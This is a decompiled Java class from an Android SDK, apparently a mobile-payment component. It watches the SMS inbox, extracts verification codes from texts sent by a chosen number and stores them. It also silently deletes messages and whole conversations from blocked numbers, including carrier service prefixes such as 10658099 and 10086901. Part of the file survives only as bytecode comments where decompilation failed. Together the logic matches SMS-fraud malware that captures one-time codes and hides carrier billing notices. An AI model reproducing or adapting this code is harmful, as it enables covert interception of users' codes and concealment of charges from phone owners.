package com.lp.sdk.yninterface.service;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import com.lepeng.data.UtilApplication;
import com.lepeng.utils.L;
import com.lepeng.utils.StrUtil;
import com.lp.sdk.yninterface.util.PreferencesUtils;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsContentObserver
  extends ContentObserver
{
  private Context a;
  private String aR;
  private String aS;
  private String aT;
  
  public SmsContentObserver(Context paramContext, Handler paramHandler)
  {
    super(paramHandler);
    this.a = paramContext;
  }
  
  public String getMobileText()
  {
    return this.aR;
  }
  
  public String getNumber()
  {
    return this.aS;
  }
  
  public String getSendNumber()
  {
    return this.aT;
  }
  
  public void getSmsFromPhone(String paramString)
  {
    Object localObject1 = new ArrayList();
    Object localObject2 = new ArrayList();
    Uri localUri = Uri.parse("content://sms");
    ContentResolver localContentResolver;
    Object localObject3;
    if (paramString != null)
    {
      localContentResolver = this.a.getContentResolver();
      localObject3 = "read" + " = 0";
      localObject3 = localContentResolver.query(localUri, new String[] { "_id", "thread_id", "address", "body" }, (String)localObject3, null, "date DESC");
    }
    for (;;)
    {
      String str1;
      String str2;
      try
      {
        boolean bool = ((Cursor)localObject3).moveToNext();
        if (!bool)
        {
          ((Cursor)localObject3).close();
          System.out.print(((ArrayList)localObject2).toString());
          System.out.print(((ArrayList)localObject1).toString());
          paramString = ((ArrayList)localObject2).iterator();
          if (paramString.hasNext()) {
            break label513;
          }
          paramString = ((ArrayList)localObject1).iterator();
          if (paramString.hasNext()) {
            break label593;
          }
          return;
        }
        long l1 = ((Cursor)localObject3).getLong(1);
        long l2 = ((Cursor)localObject3).getLong(0);
        str1 = ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndex("address"));
        if (str1.startsWith(paramString))
        {
          str2 = ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndex("body"));
          if (str2 != null)
          {
            Matcher localMatcher = Pattern.compile("([a-zA-Z0-9]+)").matcher(str2);
            if (!localMatcher.find()) {
              break label479;
            }
            System.out.println(localMatcher.group());
            str2 = localMatcher.group(0);
            setMobileText(str2);
            setSendNumber(str1);
            PreferencesUtils.putString(this.a, "mobileText", str2);
          }
        }
        if (UtilApplication.getInstance() != null) {
          L.e("短信读写器：未读消息有：" + l1 + "::" + str1);
        }
        str2 = StrUtil.getNum(str1);
        if ((!SMSCodeBroadcast.getShieldStrs().contains(str2)) && (!SMSCodeBroadcast.getShieldStrs().contains(str1)) && (!str1.startsWith("10658099")) && (!str1.startsWith("10086901"))) {
          continue;
        }
        if (UtilApplication.getInstance() != null) {
          L.e("是需要屏蔽的号码，加到要删除的号码");
        }
        System.out.print("");
        if (!((ArrayList)localObject2).contains(Long.valueOf(l2))) {
          ((ArrayList)localObject2).add(Long.valueOf(l2));
        }
        if (((ArrayList)localObject1).contains(Long.valueOf(l1))) {
          continue;
        }
        if (UtilApplication.getInstance() != null) {
          L.e("需要屏蔽的短信会话");
        }
        ((ArrayList)localObject1).add(Long.valueOf(l1));
        continue;
        str2 = StrUtil.getyzm(str2);
      }
      finally
      {
        ((Cursor)localObject3).close();
      }
      label479:
      setMobileText(str2);
      setSendNumber(str1);
      PreferencesUtils.putString(this.a, "mobileText", str2);
      continue;
      label513:
      localObject2 = (Long)paramString.next();
      int i = localContentResolver.delete(localUri, "_id=" + localObject2, null);
      if (UtilApplication.getInstance() != null)
      {
        L.e("删除号码:" + localObject2 + "成功，删除" + i + "条");
        continue;
        label593:
        localObject1 = (Long)paramString.next();
        if (((Long)localObject1).longValue() != -1L)
        {
          i = localContentResolver.delete(Uri.parse("content://sms/conversations/" + localObject1), null, null);
          if (UtilApplication.getInstance() != null) {
            L.e("删除对话" + localObject1 + "成功，删除" + i + "条");
          }
        }
      }
    }
  }
  
  /* Error */
  public void getSmsInPhone()
  {
    // Byte code:
    //   0: new 32	java/util/ArrayList
    //   3: dup
    //   4: invokespecial 35	java/util/ArrayList:<init>	()V
    //   7: astore 8
    //   9: new 32	java/util/ArrayList
    //   12: dup
    //   13: invokespecial 35	java/util/ArrayList:<init>	()V
    //   16: astore 10
    //   18: ldc 37
    //   20: invokestatic 43	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   23: astore 9
    //   25: aload_0
    //   26: getfield 17	com/lp/sdk/yninterface/service/SmsContentObserver:a	Landroid/content/Context;
    //   29: invokevirtual 49	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   32: astore 7
    //   34: new 51	java/lang/StringBuilder
    //   37: dup
    //   38: ldc 53
    //   40: invokestatic 59	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   43: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   46: ldc 63
    //   48: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   51: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   54: astore 11
    //   56: aload 7
    //   58: aload 9
    //   60: iconst_3
    //   61: anewarray 55	java/lang/String
    //   64: dup
    //   65: iconst_0
    //   66: ldc 72
    //   68: aastore
    //   69: dup
    //   70: iconst_1
    //   71: ldc 74
    //   73: aastore
    //   74: dup
    //   75: iconst_2
    //   76: ldc 76
    //   78: aastore
    //   79: aload 11
    //   81: aconst_null
    //   82: ldc 80
    //   84: invokevirtual 86	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   87: astore 11
    //   89: aload 11
    //   91: invokeinterface 92 1 0
    //   96: istore_2
    //   97: iload_2
    //   98: ifne +69 -> 167
    //   101: aload 11
    //   103: invokeinterface 95 1 0
    //   108: getstatic 101	java/lang/System:out	Ljava/io/PrintStream;
    //   111: aload 10
    //   113: invokevirtual 102	java/util/ArrayList:toString	()Ljava/lang/String;
    //   116: invokevirtual 107	java/io/PrintStream:print	(Ljava/lang/String;)V
    //   119: getstatic 101	java/lang/System:out	Ljava/io/PrintStream;
    //   122: aload 8
    //   124: invokevirtual 102	java/util/ArrayList:toString	()Ljava/lang/String;
    //   127: invokevirtual 107	java/io/PrintStream:print	(Ljava/lang/String;)V
    //   130: aload 10
    //   132: invokevirtual 111	java/util/ArrayList:iterator	()Ljava/util/Iterator;
    //   135: astore 10
    //   137: aload 10
    //   139: invokeinterface 116 1 0
    //   144: ifne +243 -> 387
    //   147: aload 8
    //   149: invokevirtual 111	java/util/ArrayList:iterator	()Ljava/util/Iterator;
    //   152: astore 8
    //   154: aload 8
    //   156: invokeinterface 116 1 0
    //   161: istore_2
    //   162: iload_2
    //   163: ifne +305 -> 468
    //   166: return
    //   167: aload 11
    //   169: iconst_1
    //   170: invokeinterface 120 2 0
    //   175: lstore_3
    //   176: aload 11
    //   178: iconst_0
    //   179: invokeinterface 120 2 0
    //   184: lstore 5
    //   186: aload 11
    //   188: aload 11
    //   190: ldc 76
    //   192: invokeinterface 124 2 0
    //   197: invokeinterface 128 2 0
    //   202: astore 12
    //   204: invokestatic 177	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   207: ifnull +32 -> 239
    //   210: new 51	java/lang/StringBuilder
    //   213: dup
    //   214: ldc -77
    //   216: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   219: lload_3
    //   220: invokevirtual 182	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   223: ldc -72
    //   225: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   228: aload 12
    //   230: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   233: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   236: invokestatic 189	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   239: aload 12
    //   241: invokestatic 195	com/lepeng/utils/StrUtil:getNum	(Ljava/lang/String;)Ljava/lang/String;
    //   244: astore 13
    //   246: invokestatic 201	com/lp/sdk/yninterface/service/SMSCodeBroadcast:getShieldStrs	()Ljava/util/ArrayList;
    //   249: aload 13
    //   251: invokevirtual 205	java/util/ArrayList:contains	(Ljava/lang/Object;)Z
    //   254: ifne +34 -> 288
    //   257: invokestatic 201	com/lp/sdk/yninterface/service/SMSCodeBroadcast:getShieldStrs	()Ljava/util/ArrayList;
    //   260: aload 12
    //   262: invokevirtual 205	java/util/ArrayList:contains	(Ljava/lang/Object;)Z
    //   265: ifne +23 -> 288
    //   268: aload 12
    //   270: ldc -49
    //   272: invokevirtual 132	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   275: ifne +13 -> 288
    //   278: aload 12
    //   280: ldc -47
    //   282: invokevirtual 132	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   285: ifeq -196 -> 89
    //   288: invokestatic 177	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   291: ifnull +8 -> 299
    //   294: ldc -45
    //   296: invokestatic 189	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   299: getstatic 101	java/lang/System:out	Ljava/io/PrintStream;
    //   302: ldc -43
    //   304: invokevirtual 107	java/io/PrintStream:print	(Ljava/lang/String;)V
    //   307: aload 10
    //   309: lload 5
    //   311: invokestatic 218	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   314: invokevirtual 205	java/util/ArrayList:contains	(Ljava/lang/Object;)Z
    //   317: ifne +14 -> 331
    //   320: aload 10
    //   322: lload 5
    //   324: invokestatic 218	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   327: invokevirtual 221	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   330: pop
    //   331: aload 8
    //   333: lload_3
    //   334: invokestatic 218	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   337: invokevirtual 205	java/util/ArrayList:contains	(Ljava/lang/Object;)Z
    //   340: ifne -251 -> 89
    //   343: invokestatic 177	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   346: ifnull +8 -> 354
    //   349: ldc -33
    //   351: invokestatic 189	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   354: aload 8
    //   356: lload_3
    //   357: invokestatic 218	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   360: invokevirtual 221	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   363: pop
    //   364: goto -275 -> 89
    //   367: astore 7
    //   369: aload 11
    //   371: invokeinterface 95 1 0
    //   376: aload 7
    //   378: athrow
    //   379: astore 7
    //   381: aload 7
    //   383: invokevirtual 264	java/lang/Exception:printStackTrace	()V
    //   386: return
    //   387: aload 10
    //   389: invokeinterface 230 1 0
    //   394: checkcast 215	java/lang/Long
    //   397: astore 11
    //   399: aload 7
    //   401: aload 9
    //   403: new 51	java/lang/StringBuilder
    //   406: dup
    //   407: ldc -24
    //   409: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   412: aload 11
    //   414: invokevirtual 235	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   417: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   420: aconst_null
    //   421: invokevirtual 239	android/content/ContentResolver:delete	(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    //   424: istore_1
    //   425: invokestatic 177	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   428: ifnull -291 -> 137
    //   431: new 51	java/lang/StringBuilder
    //   434: dup
    //   435: ldc -15
    //   437: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   440: aload 11
    //   442: invokevirtual 235	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   445: ldc -13
    //   447: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   450: iload_1
    //   451: invokevirtual 246	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   454: ldc -8
    //   456: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   459: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   462: invokestatic 189	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   465: goto -328 -> 137
    //   468: aload 8
    //   470: invokeinterface 230 1 0
    //   475: checkcast 215	java/lang/Long
    //   478: astore 9
    //   480: aload 9
    //   482: invokevirtual 252	java/lang/Long:longValue	()J
    //   485: ldc2_w 253
    //   488: lcmp
    //   489: ifeq -335 -> 154
    //   492: aload 7
    //   494: new 51	java/lang/StringBuilder
    //   497: dup
    //   498: ldc_w 256
    //   501: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   504: aload 9
    //   506: invokevirtual 235	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   509: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   512: invokestatic 43	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   515: aconst_null
    //   516: aconst_null
    //   517: invokevirtual 239	android/content/ContentResolver:delete	(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    //   520: istore_1
    //   521: invokestatic 177	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   524: ifnull -370 -> 154
    //   527: new 51	java/lang/StringBuilder
    //   530: dup
    //   531: ldc_w 258
    //   534: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   537: aload 9
    //   539: invokevirtual 235	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   542: ldc -13
    //   544: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   547: iload_1
    //   548: invokevirtual 246	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   551: ldc -8
    //   553: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   556: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   559: invokestatic 189	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   562: goto -408 -> 154
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	565	0	this	SmsContentObserver
    //   424	124	1	i	int
    //   96	67	2	bool	boolean
    //   175	182	3	l1	long
    //   184	139	5	l2	long
    //   32	25	7	localContentResolver	ContentResolver
    //   367	10	7	localObject1	Object
    //   379	114	7	localException	Exception
    //   7	462	8	localObject2	Object
    //   23	515	9	localObject3	Object
    //   16	372	10	localObject4	Object
    //   54	387	11	localObject5	Object
    //   202	77	12	str1	String
    //   244	6	13	str2	String
    // Exception table:
    //   from	to	target	type
    //   89	97	367	finally
    //   167	239	367	finally
    //   239	288	367	finally
    //   288	299	367	finally
    //   299	331	367	finally
    //   331	354	367	finally
    //   354	364	367	finally
    //   18	89	379	java/lang/Exception
    //   101	137	379	java/lang/Exception
    //   137	154	379	java/lang/Exception
    //   154	162	379	java/lang/Exception
    //   369	379	379	java/lang/Exception
    //   387	465	379	java/lang/Exception
    //   468	562	379	java/lang/Exception
  }
  
  public void onChange(boolean paramBoolean)
  {
    System.err.println("短信内容变化");
    super.onChange(paramBoolean);
    getSmsFromPhone(getNumber());
  }
  
  public void setMobileText(String paramString)
  {
    this.aR = paramString;
  }
  
  public void setNumber(String paramString)
  {
    this.aS = paramString;
  }
  
  public void setSendNumber(String paramString)
  {
    this.aT = paramString;
  }
}
